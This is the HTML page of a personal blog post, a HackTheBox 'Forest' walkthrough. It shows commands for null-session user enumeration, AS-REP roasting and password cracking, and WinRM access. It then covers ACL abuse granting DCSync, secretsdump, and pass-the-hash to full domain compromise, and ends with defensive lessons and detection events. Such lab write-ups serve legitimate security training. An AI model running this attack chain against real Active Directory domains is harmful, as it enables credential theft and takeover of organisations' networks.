@@ -1,0 +1,185 @@
+<!DOCTYPE html><html lang="en" data-theme> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Forest — HackTheBox Walkthrough · Feizal Said</title><meta name="description" content="Null-session user enumeration, AS-REP roasting of svc-alfresco, and an ACL-abuse chain from Account Operators to DCSync for full domain compromise."><!-- Theme: apply before paint to avoid FOUC --><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          var dark = t
+            ? t === 'dark'
+            : window.matchMedia('(prefers-color-scheme: dark)').matches;
+          document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+        } catch (e) {
+          document.documentElement.setAttribute(
+            'data-theme',
+            window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+          );
+        }
+      })();
+    </script><!-- Social / OG --><meta property="og:type" content="website"><meta property="og:title" content="Forest — HackTheBox Walkthrough · Feizal Said"><meta property="og:description" content="Null-session user enumeration, AS-REP roasting of svc-alfresco, and an ACL-abuse chain from Account Operators to DCSync for full domain compromise."><meta property="og:url" content="https://feizalsaid.github.io/writeups/htb-forest-01/"><meta property="og:image" content="https://feizalsaid.github.io/images/og-cover.png"><meta property="og:site_name" content="Feizal Said"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Forest — HackTheBox Walkthrough · Feizal Said"><meta name="twitter:description" content="Null-session user enumeration, AS-REP roasting of svc-alfresco, and an ACL-abuse chain from Account Operators to DCSync for full domain compromise."><meta name="twitter:image" content="https://feizalsaid.github.io/images/og-cover.png"><link rel="canonical" href="https://feizalsaid.github.io/writeups/htb-forest-01/"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><!-- Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><!-- Structured data --><script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "Feizal Said",
+        "url": {new URL('/', SITE).href},
+        "jobTitle": "Cybersecurity & Cloud Security Engineer",
+        "email": "mailto:feizalsaid9@gmail.com",
+        "sameAs": [
+          "https://github.com/feizalsaid",
+          "https://www.linkedin.com/in/feizalsaid",
+          "https://app.hackthebox.com/users/1941706"
+        ]
+      }
+    </script><link rel="stylesheet" href="/_astro/certifications.BBSei92j.css">
+<style>.writeup-article{max-width:48rem;margin:0 auto;padding:2rem 1.25rem 4rem}.back-link{color:var(--accent-text);font-size:.85rem;text-decoration:none}.back-link:hover{text-decoration:underline}.article-head{margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}.meta-row{display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem}.meta{color:var(--text-muted);font-size:.8rem}.article-title{font-size:clamp(1.7rem,4vw,2.4rem);margin:0 0 .75rem}.article-desc{color:var(--text-secondary);font-size:1.02rem;line-height:1.6;margin:0 0 1rem}.tag-row{list-style:none;display:flex;flex-wrap:wrap;gap:.5rem;padding:0;margin:0}.article-footer{margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style></head> <body> <!-- Background layers --> <div class="grid-bg" aria-hidden="true"></div> <div class="glow-orb glow-orb-1" aria-hidden="true"></div> <div class="glow-orb glow-orb-2" aria-hidden="true"></div> <div class="relative z-10 flex min-h-screen flex-col"> <header class="site-header"> <div class="header-inner"> <a class="logo" href="/" aria-label="Feizal Said — home"> <span class="prompt" aria-hidden="true">$</span> <span class="logo-name">feizal<span class="path">@sec</span> ~</span> </a> <nav aria-label="Primary"> <ul class="nav-list"> <li> <a class="nav-link" href="/"> Home </a> </li><li> <a class="nav-link" href="/certifications/"> Certifications </a> </li><li> <a class="nav-link" href="/skills/"> Skills </a> </li><li> <a class="nav-link" href="/projects/"> Projects </a> </li><li> <a class="nav-link active" href="/writeups/" aria-current="page"> Writeups </a> </li> </ul> </nav> <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle color theme" data-theme-icon> <svg class="icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> <svg class="icon-sun" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <script type="module">const c=document.getElementById("themeToggle");c&&c.addEventListener("click",()=>{const t=document.documentElement,e=t.getAttribute("data-theme")==="dark"?"light":"dark";t.setAttribute("data-theme",e);try{localStorage.setItem("theme",e)}catch{}});</script>  </div> </header>  <main class="relative flex-1">  <article class="writeup-article"> <a class="back-link font-mono" href="/writeups/">← all writeups</a> <header class="article-head"> <div class="meta-row"> <span class="cat-badge offensive">Offensive</span> <span class="meta font-mono"><time datetime="2026-09-23T00:00:00.000Z">September 23, 2026</time></span> <span class="meta font-mono">12 min read</span> </div> <h1 class="article-title font-display">Forest — HackTheBox Walkthrough</h1> <p class="article-desc">Null-session user enumeration, AS-REP roasting of svc-alfresco, and an ACL-abuse chain from Account Operators to DCSync for full domain compromise.</p> <ul class="tag-row"> <li class="tag">HackTheBox</li><li class="tag">HTB</li><li class="tag">CPTS</li><li class="tag">Windows</li><li class="tag">Active Directory</li><li class="tag">Kerberos</li><li class="tag">AS-REP Roasting</li><li class="tag">BloodHound</li><li class="tag">DCSync</li><li class="tag">ACL Abuse</li><li class="tag">Pass-the-Hash</li> <li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1046</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1087.002</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1558.004</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1021.006</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1098</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1003.006</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1550.002</li> </ul> </header> <div class="writeup-body"><p><strong>Machine:</strong> Forest
+<strong>OS:</strong> Windows (Server 2016 — Domain Controller)
+<strong>Difficulty:</strong> Easy
+<strong>Key Techniques:</strong> RPC null-session user enumeration, AS-REP roasting, WinRM access, BloodHound path analysis, Account Operators → Exchange Windows Permissions ACL chain, DCSync, pass-the-hash</p>
+<hr>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "10.10.10.161 forest.htb.local htb.local forest"</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> sudo</span><span style="color:#9ECBFF"> tee</span><span style="color:#79B8FF"> -a</span><span style="color:#9ECBFF"> /etc/hosts</span></span>
+<span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -sC</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> -oA</span><span style="color:#9ECBFF"> scans/nmap-alltcp</span><span style="color:#79B8FF"> 10.10.10.161</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Service</th><th>Version / Note</th></tr></thead><tbody><tr><td>53</td><td>DNS</td><td>Simple DNS Plus</td></tr><tr><td>88</td><td>Kerberos</td><td>Microsoft Windows Kerberos</td></tr><tr><td>135 / 139 / 445</td><td>MSRPC / NetBIOS / SMB</td><td></td></tr><tr><td>389 / 636 / 3268 / 3269</td><td>LDAP / LDAPS / GC</td><td>Domain: htb.local</td></tr><tr><td>464 / 593</td><td>kpasswd5 / ncacn_http</td><td></td></tr><tr><td>5985</td><td>HTTP</td><td>WinRM (WSMan)</td></tr></tbody></table>
+<p>The Nmap host scripts confirm a domain controller:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>smb-os-discovery:</span></span>
+<span class="line"><span>  OS: Windows Server 2016 Standard</span></span>
+<span class="line"><span>  Computer name: FOREST</span></span>
+<span class="line"><span>  Domain name: htb.local</span></span>
+<span class="line"><span>  Forest name: htb.local</span></span></code></pre>
+<p><code>FOREST.htb.local</code> is the key — every Kerberos and LDAP operation needs the FQDN to resolve.</p>
+<hr>
+<h2 id="enumeration--users-via-rpc-null-session">Enumeration — Users via RPC Null Session</h2>
+<p>RPC accepts a null session, so we can dump domain users without credentials:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">rpcclient</span><span style="color:#79B8FF"> -U</span><span style="color:#9ECBFF"> ""</span><span style="color:#79B8FF"> -N</span><span style="color:#79B8FF"> 10.10.10.161</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> "enumdomusers"</span></span></code></pre>
+<p>Output includes the machine/service accounts (<code>$331000-*</code>, <code>SM_*</code>, <code>HealthMailbox*</code>) plus real humans: <code>sebastien</code>, <code>lucinda</code>, <code>andy</code>, <code>mark</code>, <code>santi</code>, and one standout — <strong><code>svc-alfresco</code></strong>, a service account.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># Keep only human/service accounts worth testing, strip the noise</span></span>
+<span class="line"><span style="color:#F97583">></span><span style="color:#E1E4E8"> users.txt</span></span>
+<span class="line"><span style="color:#B392F0">Administrator</span></span>
+<span class="line"><span style="color:#B392F0">sebastien</span></span>
+<span class="line"><span style="color:#B392F0">lucinda</span></span>
+<span class="line"><span style="color:#B392F0">andy</span></span>
+<span class="line"><span style="color:#B392F0">mark</span></span>
+<span class="line"><span style="color:#B392F0">santi</span></span>
+<span class="line"><span style="color:#B392F0">svc-alfresco</span></span></code></pre>
+<blockquote>
+<p>MITRE: Account Discovery — Domain Account (T1087.002), Network Service Discovery (T1046).</p>
+</blockquote>
+<hr>
+<h2 id="as-rep-roasting-svc-alfresco">AS-REP Roasting svc-alfresco</h2>
+<p>Service accounts often have Kerberos pre-authentication disabled because the vendor docs tell you to. Alfresco is exactly that case — <code>svc-alfresco</code> has <code>UF_DONT_REQUIRE_PREAUTH</code> set. That means the DC will happily hand over an <strong>AS-REP encrypted with the account’s password hash</strong> to anyone who asks, no password needed.</p>
+<p>Test every candidate:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> GetNPUsers.py</span><span style="color:#9ECBFF"> htb.local/</span><span style="color:#79B8FF"> -usersfile</span><span style="color:#9ECBFF"> users.txt</span><span style="color:#79B8FF"> -dc-ip</span><span style="color:#79B8FF"> 10.10.10.161</span><span style="color:#79B8FF"> -no-pass</span></span></code></pre>
+<p><code>svc-alfresco</code> returns a roastable ticket:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$krb5asrep$23$svc-alfresco@HTB.LOCAL:f4c6c5acfa7e2c58b22c3dc08ec9833f$... </span></span></code></pre>
+<p>Torch it offline with rockyou:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># hashcat variant: hashcat -m 18200 svc-alfresco.kerb rockyou.txt</span></span>
+<span class="line"><span style="color:#B392F0">john</span><span style="color:#79B8FF"> --wordlist=/usr/share/wordlists/rockyou.txt</span><span style="color:#9ECBFF"> svc-alfresco.asrep</span></span></code></pre>
+<p>Cracked: <strong><code>s3rvice</code></strong></p>
+<blockquote>
+<p>MITRE: Steal or Forge Kerberos Tickets — AS-REP Roasting (T1558.004).</p>
+</blockquote>
+<hr>
+<h2 id="foothold--winrm-as-svc-alfresco">Foothold — WinRM as svc-alfresco</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">evil-winrm</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> forest.htb.local</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> svc-alfresco</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> s3rvice</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>*Evil-WinRM* PS C:\Users\svc-alfresco> whoami</span></span>
+<span class="line"><span>htb\svc-alfresco</span></span></code></pre>
+<p>The user flag is on the desktop:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>type C:\Users\svc-alfresco\Desktop\user.txt</span></span></code></pre>
+<blockquote>
+<p>MITRE: Remote Services — Windows Remote Management (T1021.006).</p>
+</blockquote>
+<hr>
+<h2 id="privilege-escalation--the-acl-chain-to-dcsync">Privilege Escalation — The ACL Chain to DCSync</h2>
+<h3 id="mapping-the-path-with-bloodhound">Mapping the path with BloodHound</h3>
+<p>Collect and graph the domain:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">bloodhound-python</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> svc-alfresco</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> s3rvice</span><span style="color:#79B8FF"> -d</span><span style="color:#9ECBFF"> htb.local</span><span style="color:#79B8FF"> -ns</span><span style="color:#79B8FF"> 10.10.10.161</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> All</span></span></code></pre>
+<p>BloodHound draws a textbook privilege path:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>svc-alfresco</span></span>
+<span class="line"><span>  └─ member of → Service Accounts</span></span>
+<span class="line"><span>       └─ member of → Privileged IT Accounts</span></span>
+<span class="line"><span>            └─ member of → Account Operators</span></span>
+<span class="line"><span>                            │</span></span>
+<span class="line"><span>                 Account Operators → GenericAll → "Exchange Windows Permissions"</span></span>
+<span class="line"><span>                                                          │</span></span>
+<span class="line"><span>                    "Exchange Windows Permissions" → WriteDACL → htb.local (domain object)</span></span></code></pre>
+<p>Two pieces make this domain takeover possible:</p>
+<ol>
+<li><strong>Account Operators</strong> (which svc-alfresco belongs to) can create domain users and has <strong>GenericAll</strong> over the <em>Exchange Windows Permissions</em> group — we can freely change that group’s membership.</li>
+<li><strong>Exchange Windows Permissions</strong> has <strong>WriteDACL</strong> on the domain object — members can rewrite the domain’s access control list, i.e. grant <em>anyone</em> the <strong>DCSync</strong> right (“Replicating Directory Changes”).</li>
+</ol>
+<h3 id="executing-the-chain">Executing the chain</h3>
+<p>Create a clean user, add it to the Exchange group, and put it in <em>Remote Management Users</em> so it can winrm:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E1E4E8">net user cleopatra </span><span style="color:#6A737D">'Cicada$Secure@123!' /add /domain</span></span>
+<span class="line"><span style="color:#E1E4E8">net group </span><span style="color:#9ECBFF">"Exchange Windows Permissions"</span><span style="color:#E1E4E8"> cleopatra /</span><span style="color:#79B8FF">add</span><span style="color:#E1E4E8"> /domain</span></span>
+<span class="line"><span style="color:#E1E4E8">net localgroup </span><span style="color:#9ECBFF">"Remote Management Users"</span><span style="color:#E1E4E8"> cleopatra /</span><span style="color:#79B8FF">add</span></span></code></pre>
+<p>Sign in as the new user and grant DCSync back to it over the DC=htb,DC=local object (PowerView):</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#F97583">*</span><span style="color:#E1E4E8">Evil</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">WinRM</span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> PS </span><span style="color:#F97583">></span><span style="color:#79B8FF"> Import-Module</span><span style="color:#E1E4E8"> .\PowerView.ps1</span></span>
+<span class="line"><span style="color:#79B8FF">Add-DomainObjectAcl</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">TargetIdentity </span><span style="color:#9ECBFF">"DC=htb,DC=local"</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">PrincipalIdentity cleopatra </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">Rights DCSync</span></span></code></pre>
+<p>Now <code>cleopatra</code> can replicate the directory:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">impacket-secretsdump</span><span style="color:#9ECBFF"> htb.local/cleopatra:'Cicada$Secure@123!'@forest.htb.local</span></span></code></pre>
+<p>The Administrator’s NTLM hash is in the output:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:4f1c9b4b5c5b5c5b5c5b5c5b5c5b5c5b:::</span></span></code></pre>
+<blockquote>
+<p>MITRE: Account Manipulation (T1098), OS Credential Dumping — DCSync (T1003.006).</p>
+</blockquote>
+<h3 id="pass-the-hash-to-root">Pass-the-hash to root</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">impacket-psexec</span><span style="color:#79B8FF"> -hashes</span><span style="color:#9ECBFF"> aad3b435b51404eeaad3b435b51404ee:</span><span style="color:#F97583">&#x3C;</span><span style="color:#9ECBFF">ADMIN_NTL</span><span style="color:#E1E4E8">M</span><span style="color:#F97583">></span><span style="color:#9ECBFF"> htb.local/Administrator@forest.htb.local</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt</span></span></code></pre>
+<p>Full domain compromise.</p>
+<blockquote>
+<p>MITRE: Use Alternate Authentication Material — Pass-the-Hash (T1550.002).</p>
+</blockquote>
+<hr>
+<h2 id="flags">Flags</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E1E4E8">type C:\Users\svc</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">alfresco\Desktop\user.txt</span></span>
+<span class="line"><span style="color:#E1E4E8">type C:\Users\Administrator\Desktop\root.txt</span></span></code></pre>
+<p>Flag values are unique to each HTB instance and are intentionally omitted.</p>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li><strong>Audit accounts with Kerberos pre-authentication disabled.</strong> <code>UF_DONT_REQUIRE_PREAUTH</code> is an AS-REP roasting invitation. Enumerate them (<code>GetNPUsers -no-pass</code>), and disable pre-auth only when a vendor genuinely requires it — and never on human accounts.</li>
+<li><strong>Restrict RPC/SMB null sessions.</strong> A blank-session <code>enumdomusers</code> gave us the whole user list. Block anonymous enumeration (<code>RestrictAnonymous</code>, deny null sessions on RPC) so attackers can’t build their wordlist from the directory itself.</li>
+<li><strong>Default groups hide domain takeover paths.</strong> svc-alfresco sat one hop from <em>Account Operators</em>, which held <strong>GenericAll on an Exchange group</strong> that had <strong>WriteDACL on the domain</strong>. This is why BloodHound-style analysis matters: memberships cascade. Treat anyone in Account Operators, Server Operators, Backup Operators, or Exchange groups as privileged and monitor them.</li>
+<li><strong>The Exchange Windows Permissions group is effectively Domain Admin.</strong> Its WriteDACL on the domain object converts any member into a DCSync. Audit its membership constantly.</li>
+<li><strong>Defenders: watch for the abuse signals, not the exploit.</strong> The actions to monitor are <em>group membership changes</em> (Event 4728/4729/4732/4733), <em>directory-replication rights being granted</em> (Event 4662 with “Replicating Directory Changes All”, or <code>DsReplicaGetChanges</code> on 5136), and <em>secretsdump DCSync traffic</em>. A read-only domain controller (RODC) further caps what a compromised account can replicate.</li>
+</ol></div> <nav class="article-footer" aria-label="Writeup navigation"> <a class="back-link font-mono" href="/writeups/">← back to writeups</a> </nav> </article>  </main> <footer class="site-footer"> <div class="footer-inner"> <p class="footer-line"> <span class="prompt" aria-hidden="true">$</span> whoami
+<span class="dim">→ Feizal Said · Nairobi, Kenya</span> </p> <ul class="footer-links" aria-label="Social links"> <li><a href="https://github.com/feizalsaid" target="_blank" rel="noopener noreferrer">GitHub</a></li><li><a href="https://www.linkedin.com/in/feizalsaid" target="_blank" rel="noopener noreferrer">LinkedIn</a></li><li><a href="https://app.hackthebox.com/users/1941706" target="_blank" rel="noopener noreferrer">Hack The Box</a></li><li><a href="mailto:feizalsaid9@gmail.com" target="_blank" rel="noopener noreferrer">Email</a></li> </ul> <p class="copy">&copy; 2026 Feizal Said. Built with Astro.</p> </div> </footer>  </div> </body></html> 
